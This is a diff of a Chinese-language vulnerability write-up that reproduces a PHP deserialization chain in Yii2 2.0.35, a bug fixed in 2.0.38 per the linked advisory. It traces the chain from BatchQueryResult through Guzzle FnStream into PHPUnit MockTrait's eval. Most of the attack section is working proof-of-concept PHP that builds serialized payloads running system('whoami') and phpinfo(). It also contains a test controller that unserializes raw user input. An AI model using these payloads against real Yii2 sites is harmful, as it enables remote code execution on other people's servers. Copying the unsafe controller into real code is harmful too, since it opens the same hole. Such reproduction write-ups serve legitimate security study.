@@ -29,13 +29,13 @@ source: "MrWQ/vulnerability-paper"
 开始
 --
 
-反序列化漏洞影响到 2.0.38 被修复 https://github.com/yiisoft/yii2/security/advisories/GHSA-699q-wcff-g9mj  
+反序列化漏洞影响到 2.0.38 被修复 https://github.com/yiisoft/yii2/security/advisories/GHSA-699q-wcff-g9mj  
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/WdbaA7b2IE6D8InhXuGX2q6Cbw7zhMJLqTFh0AII5Hicxje7ykC0nDibXY40REjhnf6cUghx7icR33pq0fadAHYlQ/640?wx_fmt=png)
 
 Hello World
 -----------
 
-由于挖洞的时候遇到一个 cms 是 Yii2.0.35 的所以我选择复现 Yii2.0.35: https://github.com/yiisoft/yii2/releases/tag/2.0.35, 跟着文档把 Hello World 写出来. 大概了解一下开发流程.
+由于挖洞的时候遇到一个 cms 是 Yii2.0.35 的所以我选择复现 Yii2.0.35: https://github.com/yiisoft/yii2/releases/tag/2.0.35, 跟着文档把 Hello World 写出来. 大概了解一下开发流程.
 
 环境我用：phpstudy 集成环境. apache2.4.39 + php 7.4.3 + phpstorm 开启 xdebug;
 
@@ -75,13 +75,13 @@ Hello World
 反序列化利用链
 -------
 
-全局搜索 __destruct (反序列化后, 销毁对象时会触发的函数), 定位到 vendor/yiisoft/yii2/db/BatchQueryResult.php, 给 this->reset();
+全局搜索 __destruct (反序列化后, 销毁对象时会触发的函数), 定位到 vendor/yiisoft/yii2/db/BatchQueryResult.php, 给 this->reset();
 
 ```
 public function __destruct()
 {
-    // make sure cursor is closed
-    $this->reset();
+    // make sure cursor is closed
+    $this->reset();
 }
 ```
 
@@ -90,22 +90,22 @@ public function __destruct()
 ```
 public function reset()
 {
-    if ($this->_dataReader !== null) {
-        $this->_dataReader->close();
-    }
-    $this->_dataReader = null;
-    $this->_batch = null;
-    $this->_value = null;
-    $this->_key = null;
+    if ($this->_dataReader !== null) {
+        $this->_dataReader->close();
+    }
+    $this->_dataReader = null;
+    $this->_batch = null;
+    $this->_value = null;
+    $this->_key = null;
 }
 ```
 
-那么这里就形成了一个跳板. 全局找 close() 方法. 最后在 /vendor/guzzlehttp/psr7/src/FnStream.php 中找到一个非常危险的 close 方法, 该方法接收一个参数, 是可控的成员属性.
+那么这里就形成了一个跳板. 全局找 close() 方法. 最后在 /vendor/guzzlehttp/psr7/src/FnStream.php 中找到一个非常危险的 close 方法, 该方法接收一个参数, 是可控的成员属性.
 
 ```
 public function close()
 {
-    return call_user_func($this->_fn_close);
+    return call_user_func($this->_fn_close);
 }
 ```
 
@@ -116,10 +116,10 @@ POC 编写.
 
 ```
 class TestController extends Controller {
-    public function actionIndex($message="Hello") {
-        var_dump(unserialize($message));
-//        return $this->render("index", ['message'=>$message]);
-    }
+    public function actionIndex($message="Hello") {
+        var_dump(unserialize($message));
+//        return $this->render("index", ['message'=>$message]);
+    }
 }
 ```
 
@@ -130,8 +130,8 @@ vendor/yiisoft/yii2/db/BatchQueryResult.php
 ```
 namespace yii\db;
 class BatchQueryResult {
-    // 需要控制的成员属性
-    private $_dataReader;
+    // 需要控制的成员属性
+    private $_dataReader;
 }
 ```
 
@@ -140,8 +140,8 @@ vendor/guzzlehttp/psr7/src/FnStream.php
 ```
 namespace GuzzleHttp\Psr7;
 class FnStream implements StreamInterface {
-    // 需要控制的参数, 原本并没有定义所以无要求
-    var $_fn_close;
+    // 需要控制的参数, 原本并没有定义所以无要求
+    var $_fn_close;
 }
 ```
 
@@ -150,21 +150,21 @@ poc 如下
 ```
 <?php
 namespace GuzzleHttp\Psr7 {
-    class FnStream {
-        var $_fn_close = "phpinfo";
-    }
+    class FnStream {
+        var $_fn_close = "phpinfo";
+    }
 }
 namespace yii\db {
-    use GuzzleHttp\Psr7\FnStream;
-    class BatchQueryResult {
-        // 需要控制的成员属性
-        private $_dataReader;
-        public function __construct() {
-            $this->_dataReader  = new FnStream();
-        }
-    }
-    $b = new BatchQueryResult();
-    var_dump(serialize($b));
+    use GuzzleHttp\Psr7\FnStream;
+    class BatchQueryResult {
+        // 需要控制的成员属性
+        private $_dataReader;
+        public function __construct() {
+            $this->_dataReader  = new FnStream();
+        }
+    }
+    $b = new BatchQueryResult();
+    var_dump(serialize($b));
 }
 ```
 
@@ -180,15 +180,15 @@ namespace yii\db {
 
 如果要放大危害，这里只能作为跳板，还需要一个类. 全局搜索各危险函数. 寻找参数可控的方法.
 
-在 vendor\phpunit\phpunit\src\Framework\MockObject\MockTrait.php 中找到了相应的方法
+在 vendor\phpunit\phpunit\src\Framework\MockObject\MockTrait.php 中找到了相应的方法
 
 ```
 public function generate(): string
 {
-    if (!\class_exists($this->mockName, false)) {
-        eval($this->classCode);
-    }
-    return $this->mockName;
+    if (!\class_exists($this->mockName, false)) {
+        eval($this->classCode);
+    }
+    return $this->mockName;
 }
 ```
 
@@ -197,34 +197,34 @@ public function generate(): string
 ```
 <?php
 namespace PHPUnit\Framework\MockObject{
-    class MockTrait {
-        private $classCode = "system('whoami');";
-        private $mockName = "anything";
-    }
+    class MockTrait {
+        private $classCode = "system('whoami');";
+        private $mockName = "anything";
+    }
 }
 namespace GuzzleHttp\Psr7 {
-    use PHPUnit\Framework\MockObject\MockTrait;
-    class FnStream {
-        var $_fn_close;
-        function __construct() {
-            $this->_fn_close = array(
-                new MockTrait(),
-                'generate'
-            );
-        }
-    }
+    use PHPUnit\Framework\MockObject\MockTrait;
+    class FnStream {
+        var $_fn_close;
+        function __construct() {
+            $this->_fn_close = array(
+                new MockTrait(),
+                'generate'
+            );
+        }
+    }
 }
 namespace yii\db {
-    use GuzzleHttp\Psr7\FnStream;
-    class BatchQueryResult {
-        // 需要控制的成员属性
-        private $_dataReader;
-        function __construct() {
-            $this->_dataReader  = new FnStream();
-        }
-    }
-    $b = new BatchQueryResult();
-    file_put_contents("poc.txt", serialize($b));
+    use GuzzleHttp\Psr7\FnStream;
+    class BatchQueryResult {
+        // 需要控制的成员属性
+        private $_dataReader;
+        function __construct() {
+            $this->_dataReader  = new FnStream();
+        }
+    }
+    $b = new BatchQueryResult();
+    file_put_contents("poc.txt", serialize($b));
 }
 ```
 
@@ -245,34 +245,34 @@ namespace yii\db {
 ```
 <?php
 namespace PHPUnit\Framework\MockObject{
-    class MockTrait {
-        private $classCode = "system('whoami');phpinfo();";
-        private $mockName = "anything";
-    }
+    class MockTrait {
+        private $classCode = "system('whoami');phpinfo();";
+        private $mockName = "anything";
+    }
 }
 namespace GuzzleHttp\Psr7 {
-    use PHPUnit\Framework\MockObject\MockTrait;
-    class FnStream {
-        var $_fn_close;
-        function __construct() {
-            $this->_fn_close = array(
-                new MockTrait(),
-                'generate'
-            );
-        }
-    }
+    use PHPUnit\Framework\MockObject\MockTrait;
+    class FnStream {
+        var $_fn_close;
+        function __construct() {
+            $this->_fn_close = array(
+                new MockTrait(),
+                'generate'
+            );
+        }
+    }
 }
 namespace yii\db {
-    use GuzzleHttp\Psr7\FnStream;
-    class BatchQueryResult {
-        // 需要控制的成员属性
-        private $_dataReader;
-        function __construct() {
-            $this->_dataReader  = new FnStream();
-        }
-    }
-    $b = new BatchQueryResult();
-    file_put_contents("poc.txt", serialize($b));
+    use GuzzleHttp\Psr7\FnStream;
+    class BatchQueryResult {
+        // 需要控制的成员属性
+        private $_dataReader;
+        function __construct() {
+            $this->_dataReader  = new FnStream();
+        }
+    }
+    $b = new BatchQueryResult();
+    file_put_contents("poc.txt", serialize($b));
 }
 ```
 
